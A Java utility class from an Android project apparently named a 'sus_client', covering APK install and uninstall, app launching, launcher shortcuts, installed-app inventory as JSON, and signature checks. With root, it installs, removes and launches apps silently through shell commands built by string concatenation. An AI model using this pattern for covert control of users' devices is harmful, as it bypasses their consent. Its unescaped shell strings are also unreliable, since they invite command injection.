package com.android.sus_client.utils;

import android.annotation.SuppressLint;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.pm.PackageManager.NameNotFoundException;
import android.content.pm.ResolveInfo;
import android.content.pm.Signature;
import android.graphics.Bitmap;
import android.graphics.drawable.Drawable;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.os.StrictMode;
import android.provider.Settings;
import android.text.TextUtils;
import android.util.Pair;
import android.webkit.URLUtil;

import androidx.core.content.FileProvider;
import androidx.core.content.pm.ShortcutInfoCompat;
import androidx.core.content.pm.ShortcutManagerCompat;
import androidx.core.graphics.drawable.IconCompat;

import com.android.sus_client.applaunchers.ActionActivity;
import com.android.sus_client.commonutility.root.RootManager;
import com.android.sus_client.commonutility.basic.Function1;
import com.android.sus_client.commonutility.basic.Invoker;
import com.android.sus_client.commonutility.root.ShellUtils;
import com.android.sus_client.services.BuilderConfig;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.security.MessageDigest;
import java.security.cert.Certificate;
import java.util.ArrayList;
import java.util.Collections;
import java.util.HashSet;
import java.util.List;
import java.util.Objects;
import java.util.jar.JarEntry;
import java.util.jar.JarFile;

public class ApkUtils {

    public static String getApplicationName(Context context, String packageName) {
        try {
            PackageManager packageManager = context.getPackageManager();
            ApplicationInfo info = packageManager.getApplicationInfo(packageName, PackageManager.GET_META_DATA);
            return (String) packageManager.getApplicationLabel(info);
        } catch (PackageManager.NameNotFoundException e) {
            return "";
        }
    }

    public static String getApplicationName(Context context) {
        ApplicationInfo applicationInfo = context.getApplicationInfo();
        int stringId = applicationInfo.labelRes;
        return stringId == 0 ? applicationInfo.nonLocalizedLabel.toString() : context.getString(stringId);
    }

    public static Bitmap getApplicationIcon(Context context) {
        ApplicationInfo applicationInfo = context.getApplicationInfo();
        Drawable drawable = applicationInfo.loadIcon(context.getPackageManager());
        return FileUtil.drawableToBitmap(drawable);
    }

    public static Bitmap getApplicationIcon2(Context context) {
        ApplicationInfo applicationInfo = context.getApplicationInfo();
        Drawable drawable = context.getPackageManager().getApplicationIcon(applicationInfo);
        return FileUtil.drawableToBitmap(drawable);
    }

    public static void installApk(Context context, Uri uri) {
        installApkInternally(context, uri, null);
    }

    public static void installApk(Context context, File file) {
        installApk(context, file, null);
    }

    public static void installApk(Context context, File file, Function1<Void, String> error) {
        if (!file.exists()) {
            error.invoke(new Invoker<>("Apk file " + file.getPath() + " does not exists"));
            return;
        }

        String fileProviderAuthority = context.getPackageName() + ".fileprovider";
        if (!TextUtils.isEmpty(BuilderConfig.FILE_PROVIDER_AUTHORITY)) {
            fileProviderAuthority = BuilderConfig.FILE_PROVIDER_AUTHORITY;
        }

        // must use FileUri ( Uri.fromFile ) with StrictMode.VmPolicy.Builder
        // alternative you can useContentUri from file authority with ( FileProvider.getUriForFile )
        Uri contentUri;
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                contentUri = FileProvider.getUriForFile(context, fileProviderAuthority, file);
            } else {
                contentUri = Uri.fromFile(file);
            }
        } catch (Exception e) {
            throw new Error(e.getMessage());
        } catch (Error err) {
            contentUri = Uri.fromFile(file);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                String parentDirName = Objects.requireNonNull(file.getParentFile()).getName();
                String prefix = "content://" + fileProviderAuthority + "/";
                String surfix;
                if (parentDirName.equals(Environment.DIRECTORY_DOWNLOADS)) {
                    surfix = "external/" + parentDirName + "/" + file.getName();
                } else {
                    surfix = parentDirName + "/" + file.getName();
                }
                contentUri = Uri.parse(prefix + surfix);
            }
        }
        installApkInternally(context, contentUri, error);
    }

    private static void installApkInternally(Context context, Uri contentUri, Function1<Void, String> error) {
        if (RootManager.hasRootAccess()) {
            ShellUtils.executeSudoForResult("pm install " + Utils.convertUriToFilePath(context, contentUri));
            return;
        }

        try {
            String packageName = context.getPackageName();
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                Intent unKnownSourceIntent = new Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES).setData(Uri.parse(String.format("package:%s", packageName)));
                unKnownSourceIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                if (!context.getPackageManager().canRequestPackageInstalls()) {
                    context.startActivity(unKnownSourceIntent);
                } else {
                    Intent intent = new Intent(Intent.ACTION_VIEW);
                    intent.putExtra(Intent.EXTRA_NOT_UNKNOWN_SOURCE, true);
                    intent.setDataAndType(contentUri, "application/vnd.android.package-archive");
                    intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
                    context.startActivity(intent);
                }

            } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                Intent intent = new Intent(Intent.ACTION_INSTALL_PACKAGE);
                context.grantUriPermission(packageName, contentUri, Intent.FLAG_GRANT_READ_URI_PERMISSION);
                context.grantUriPermission(packageName, contentUri, Intent.FLAG_GRANT_WRITE_URI_PERMISSION);
                intent.setDataAndType(contentUri, "application/*");
                intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
                intent.addFlags(Intent.FLAG_GRANT_WRITE_URI_PERMISSION);
                context.startActivity(intent);

            } else {
                Intent intent = new Intent(Intent.ACTION_VIEW);
                intent.setDataAndType(contentUri, "application/vnd.android.package-archive");
                intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                context.startActivity(intent);

            }
        } catch (Exception e) {
            throw new Error(e.getMessage());
        } catch (Error e2) {
            e2.printStackTrace();
            if (error != null) {
                error.invoke(new Invoker<>(e2.getMessage()));
            }
        }
    }

    public static boolean launchApplication(Context context, String packageName, String activityName) {
        if (RootManager.hasRootAccess()) {
            ShellUtils.executeSudoForResult("monkey -p " + packageName + " -c android.intent.category.LAUNCHER 1");
            return true;
        }

        Intent intent = context.getPackageManager().getLaunchIntentForPackage(packageName);
        try {
            if (intent == null) {
                intent = new Intent(Intent.ACTION_MAIN);
                intent.addCategory(Intent.CATEGORY_LAUNCHER);
                intent.setPackage(packageName);
                intent.setClassName(packageName, activityName);
            }
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(intent);
            return true;
        } catch (Exception e) {
            Utils.getLog(context, "launchApplication: " + e);
            return false;
        }
    }

    public static boolean launchApplication(Context context, String packageName) {
        if (RootManager.hasRootAccess()) {
            ShellUtils.executeSudoForResult("monkey -p " + packageName + " -c android.intent.category.LAUNCHER 1");
            return true;
        }

        try {
            Intent intent = context.getPackageManager().getLaunchIntentForPackage(packageName);
            if (intent == null) throw new Exception();
            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(intent);
            return true;
        } catch (Exception e) {
            Utils.getLog(context, "launchApplication 1: " + e);
            try {
                // The URL should either launch directly in a non-browser app
                // (if it’s the default), or in the disambiguation dialog
                Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(packageName));
                intent.addCategory(Intent.CATEGORY_BROWSABLE);
                //if (Build.VERSION.SDK_INT >= 30)
                //    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_REQUIRE_NON_BROWSER);
                //else {
                intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                //}
                context.startActivity(intent);
                return true;
            } catch (Exception e2) {
                Utils.getLog(context, "launchApplication 2: " + e2);
                return false;
            }
        }
    }

    public static boolean launchApplicationSendAction(Context context) {
        try {
            Intent intent = new Intent();
            intent.setClassName(context.getPackageName(), ActionActivity.class.getName());
            intent.setAction(Intent.ACTION_SEND);
            context.startActivity(intent);
            return true;
        } catch (Exception e) {
            Utils.getLog(context, "launchApplicationSendAction: " + e);
            return false;
        }
    }

    public static void uninstallApplication(Context context, String packageName) {
        if (RootManager.hasRootAccess()) {
            ShellUtils.executeSudoForResult("pm uninstall --user 0 " + packageName);
            return;
        }

        try {
            Intent intent = new Intent(Intent.ACTION_DELETE);
            intent.setData(Uri.parse("package:" + packageName));
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(intent);
        } catch (Exception e) {
            Utils.getLog(e.toString());
        }
    }

    /**
     * This method creates the shortcut Intent which is fired when the user
     * presses the icon on the home screen
     *
     * @return Shortcut Intent
     */
    public static Intent createShortcutIntent(Context context, String url) {
        // Intent to be send, when shortcut is pressed by user ("launched")
        Intent shortcutIntent = new Intent(context, ActionActivity.class);
        shortcutIntent.setAction(Intent.ACTION_MAIN);
        shortcutIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        shortcutIntent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
        if (url != null) {
            shortcutIntent.putExtra("url", url);
        }
        return shortcutIntent;
    }

    public static void addLauncherShortcut(Context context, String url, String appName, Bitmap appIcon) {
        final String shortcutId = "LauncherShortcutID";
        try {
            final boolean isCustomPage = URLUtil.isHttpUrl(url) || URLUtil.isHttpsUrl(url);
            final Intent shortcutIntent = createShortcutIntent(context, url);

            if (isCustomPage) {
                if (ShortcutManagerCompat.isRequestPinShortcutSupported(context)) {
                    //ShortcutManagerCompat.removeDynamicShortcuts(context, Collections.singletonList(shortcutId));
                    ShortcutInfoCompat shortcut = new ShortcutInfoCompat.Builder(context, shortcutId).setShortLabel(appName).setIcon(IconCompat.createWithBitmap(appIcon)).setIntent(shortcutIntent).build();
                    ShortcutManagerCompat.requestPinShortcut(context, shortcut, null);
                    ShortcutManagerCompat.updateShortcuts(context, Collections.singletonList(shortcut));
                } else {
                    Intent installer = new Intent();
                    installer.putExtra("android.intent.extra.shortcut.INTENT", shortcutIntent);
                    installer.putExtra("android.intent.extra.shortcut.NAME", appName);
                    installer.putExtra("android.intent.extra.shortcut.ICON", appIcon);
                    installer.setAction("com.android.launcher.action.INSTALL_SHORTCUT");
                    installer.putExtra("duplicate", false); // false for avoid duplicate shortcuts
                    context.sendBroadcast(installer);
                }
            }
            //byte[] myData = MyDataPacker("SHORTCUT", System.Text.Encoding.UTF8.GetBytes("Shortcut add request was successfully sent."));
        } catch (Exception e) {
            throw new Error(e.toString());
        } catch (Error error) {
            error.printStackTrace();
            Utils.getLog(error.toString());
        }
    }

    public static void deleteLauncherShortcut(Context context, String installedShortcutName) {
        final String shortcutId = "LauncherShortcutID";
        try {
            if (ShortcutManagerCompat.isRequestPinShortcutSupported(context)) {
                ShortcutManagerCompat.removeDynamicShortcuts(context, Collections.singletonList(shortcutId));
            } else {
                final Intent shortcutIntent = createShortcutIntent(context, null);
                Intent intent = new Intent();
                intent.putExtra(Intent.EXTRA_SHORTCUT_INTENT, Intent.parseUri(shortcutIntent.toUri(0), 0));
                //intent.putExtra(Intent.EXTRA_SHORTCUT_NAME, installedShortcutName);
                intent.setAction("com.android.launcher.action.UNINSTALL_SHORTCUT");
                context.sendBroadcast(intent);
            }
        } catch (Exception e) {
            Utils.getLog(e.toString());
        }
    }

    public static JSONObject getInstalledApps(Context context) {
        JSONObject apps = new JSONObject();

        PackageManager pm = context.getPackageManager();
        List<Pair<String, String>> tmpPkgsList = new ArrayList<>();
        try {
            Intent mainIntent = new Intent(Intent.ACTION_MAIN, null);
            mainIntent.addCategory(Intent.CATEGORY_LAUNCHER);
            List<ResolveInfo> appList = pm.queryIntentActivities(mainIntent, 0);
            Collections.sort(appList, new ResolveInfo.DisplayNameComparator(pm));

            for (ResolveInfo temp : appList) {
                String activityName = temp.activityInfo.name;
                String packageName = temp.activityInfo.packageName;
                tmpPkgsList.add(new Pair<>(packageName, activityName));
            }
        } catch (Exception e) {
            Utils.getLog(e.toString());
        }

        try {
            JSONArray list = new JSONArray();
            List<PackageInfo> packList = pm.getInstalledPackages(0);
            for (int i = 0; i < packList.size(); i++) {
                PackageInfo packInfo = packList.get(i);
                // Getting list of installed non-system apps
                boolean isSystemApp = (packInfo.applicationInfo.flags & ApplicationInfo.FLAG_SYSTEM) != 0;
                if (!isSystemApp) {
                    //Drawable icon = packInfo.applicationInfo.loadIcon(pm);
                    JSONObject object = new JSONObject();
                    object.put("appName", packInfo.applicationInfo.loadLabel(pm).toString());
                    object.put("pkgName", packInfo.packageName);
                    object.put("versionName", packInfo.versionName);
                    object.put("versionCode", packInfo.versionCode);
                    object.put("firstInstallTime", packInfo.firstInstallTime);
                    object.put("lastUpdateTime", packInfo.lastUpdateTime);
                    object.put("icon", null);

                    for (int j = 0; j < tmpPkgsList.size(); j++) {
                        if (tmpPkgsList.get(j).first.equals(packInfo.packageName)) {
                            object.put("activityName", tmpPkgsList.get(j).second);
                            break;
                        }
                    }
                    list.put(object);
                }
            }
            apps.put("appsList", list);
        } catch (Exception e) {
            Utils.getLog(e.toString());
        }
        return apps;
    }

    /**
     * check if installed apk and uninstalled apk have the same Signatures.
     *
     * @param context         *
     * @param packageName     installed apk package's name
     * @param archiveFilePath uninstalled apk fill full path
     * @return *
     */

    public static boolean compareSignatureWithInstalledPackage(Context context, String packageName, String archiveFilePath) {
        final Signature[] installedPackageSignature = getInstalledPackageSignatures(context, packageName);
        final Signature[] signatureFromApk = getSignaturesFromApk(new File(archiveFilePath));
        return compareSignatures(installedPackageSignature, signatureFromApk);
    }

    @SuppressLint("PackageManagerGetSignatures")
    private static Signature[] getInstalledPackageSignatures(Context context, String packageName) {
        Signature[] signatures = null;
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                PackageInfo packageInfo = context.getPackageManager().getPackageInfo(packageName, PackageManager.GET_SIGNING_CERTIFICATES);
                signatures = packageInfo.signingInfo.getApkContentsSigners();
            } else {
                PackageInfo packageInfo = context.getPackageManager().getPackageInfo(packageName, PackageManager.GET_SIGNATURES);
                signatures = packageInfo.signatures;
            }
        } catch (NameNotFoundException e) {
            e.printStackTrace();
        }
        if (signatures == null) {
            return new Signature[]{};
        }
        return signatures;
    }

    private static Signature[] getSignaturesFromApk(File file) {
        List<Signature> signatures = new ArrayList<>();
        try {
            JarFile jarFile = new JarFile(file);
            JarEntry je = jarFile.getJarEntry("AndroidManifest.xml");
            byte[] readBuffer = new byte[8192];
            Certificate[] certs = loadCertificates(jarFile, je, readBuffer);
            if (certs != null) {
                for (Certificate c : certs) {
                    signatures.add(getSignature(c));
                }
            }
        } catch (Exception ex) {
            ex.printStackTrace();
        }
        return signatures.toArray(new Signature[signatures.size()]);
    }

    public static Certificate[] loadCertificates(JarFile jarFile, JarEntry je, byte[] readBuffer) {
        try {
            InputStream is = jarFile.getInputStream(je);
            while (is.read(readBuffer, 0, readBuffer.length) != -1) {
            }
            is.close();
            return je != null ? je.getCertificates() : null;
        } catch (IOException ignored) {
        }
        return null;
    }

    public static Signature getSignature(Certificate certificate) throws Exception {
        return new Signature(toCharsString(certificate.getEncoded()));
    }

    private static String toCharsString(byte[] sigBytes) {
        byte[] sig = sigBytes;
        final int N = sig.length;
        final int N2 = N * 2;
        char[] text = new char[N2];
        for (int j = 0; j < N; j++) {
            byte v = sig[j];
            int d = (v >> 4) & 0xf;
            text[j * 2] = (char) (d >= 10 ? ('a' + d - 10) : ('0' + d));
            d = v & 0xf;
            text[j * 2 + 1] = (char) (d >= 10 ? ('a' + d - 10) : ('0' + d));
        }
        return new String(text);
    }


    /**
     * Converting Signature into SHA-256 hash string
     */

    public static final String SHA_HASH_ALGORITHM = "SHA-256";

    public static String getSHAHashFromSignature(Signature signature) {
        // computed the sha hash (SHA1 or SHA-256) of the signature
        try {
            final MessageDigest digest = MessageDigest.getInstance(SHA_HASH_ALGORITHM);
            digest.update(signature.toByteArray());
            return bytesToHex(digest.digest());
        } catch (Exception e) {
            return "";
        }
    }

    public static String bytesToHexString(byte[] hash) {
        final StringBuilder builder = new StringBuilder();
        for (byte b : hash) {
            builder.append(String.format("%02x", b).toUpperCase());
        }
        return builder.toString();
    }

    public static String bytesToHex(byte[] bytes) {
        // convert byte array to hex string
        final char[] hexArray = {'0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'A', 'B', 'C', 'D', 'E', 'F'};
        char[] hexChars = new char[bytes.length * 2];
        int v;
        for (int j = 0; j < bytes.length; j++) {
            v = bytes[j] & 0xFF;
            hexChars[j * 2] = hexArray[v >>> 4];
            hexChars[j * 2 + 1] = hexArray[v & 0x0F];
        }
        return new String(hexChars);
    }


    public static boolean compareSignatures(Signature[] s1, Signature[] s2) {
        if (s1 == null) {
            return false;
        }
        if (s2 == null) {
            return false;
        }
        HashSet<Signature> set1 = new HashSet<>();
        Collections.addAll(set1, s1);
        HashSet<Signature> set2 = new HashSet<>();
        Collections.addAll(set2, s2);
        return set1.equals(set2);
    }

    public static ArrayList<String> getAppSignatureHash(Context context) {
        final ArrayList<String> sha1List = new ArrayList<>();
        final Signature[] installedPackageSignature = getInstalledPackageSignatures(context, context.getPackageName());
        for (Signature signature : installedPackageSignature) {
            // get SHA Hash of signature
            String shaHash = getSHAHashFromSignature(signature);
            if (!shaHash.isEmpty()) {
                sha1List.add(shaHash);
            }
        }
        return sha1List;
    }


    /**
     * This method only return compiled AndroidManifest code
     */
    public static String getAndroidManifest(String apkPath) {
        try {
            StringBuilder xml = new StringBuilder();
            JarFile jf = new JarFile(apkPath);
            try (InputStream input = jf.getInputStream(jf.getEntry("AndroidManifest.xml"))) {
                InputStreamReader isr = new InputStreamReader(input);
                BufferedReader reader = new BufferedReader(isr);
                int c;
                while ((c = reader.read()) != -1) {
                    xml.append((char) c);
                }
            }
            return xml.toString();
        } catch (Exception ex) {
            ex.printStackTrace();
            return "";
        }
    }

}